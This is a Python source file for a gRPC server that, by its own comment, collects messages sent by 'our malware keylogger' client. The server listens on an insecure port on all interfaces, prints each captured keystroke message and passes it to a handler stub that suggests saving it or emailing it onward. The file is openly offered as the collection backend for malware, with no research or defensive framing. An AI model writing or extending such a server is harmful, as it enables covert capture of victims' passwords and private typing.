import grpc
from concurrent import futures
import protos.server_pb2 as keylog_pb2
import protos.server_pb2_grpc as keylog_pb2_grpc
# here goes the grpc server side code where we can change the action fired by the client (which is our malware keylogger)

# triggred action def
def firedTHread(receivedMessage):
    print("Action fired for message:", receivedMessage)
    # here you can add any action you want to perform when a keylog is received
    # for example, save to file, send email, etc.

class KeylogServer(keylog_pb2_grpc.KeylogServiceServicer):
    def SendKeylog(self, request, context):
        print("Received:", request.message)
        firedTHread(request.message)
        return keylog_pb2.KeylogResponse(response=True)
server = grpc.server(futures.ThreadPoolExecutor(max_workers=10))
keylog_pb2_grpc.add_KeylogServiceServicer_to_server(KeylogServer(), server)
server.add_insecure_port("[::]:50051")
server.start()
server.wait_for_termination()
